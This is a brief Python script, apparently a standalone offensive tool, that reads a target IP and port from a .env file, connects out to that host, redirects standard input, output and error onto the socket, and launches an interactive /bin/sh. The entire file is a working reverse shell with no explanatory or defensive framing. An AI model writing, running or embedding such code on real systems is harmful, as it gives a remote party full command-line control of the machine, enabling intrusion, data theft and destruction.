import socket
import subprocess
import os
from dotenv import load_dotenv

load_dotenv()

host = os.getenv("IP")
port = int(os.getenv("PORT"))

def connect():
    s = socket.socket()
    s.connect((host, port))

    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    subprocess.call(['/bin/sh', '-i'])

connect()
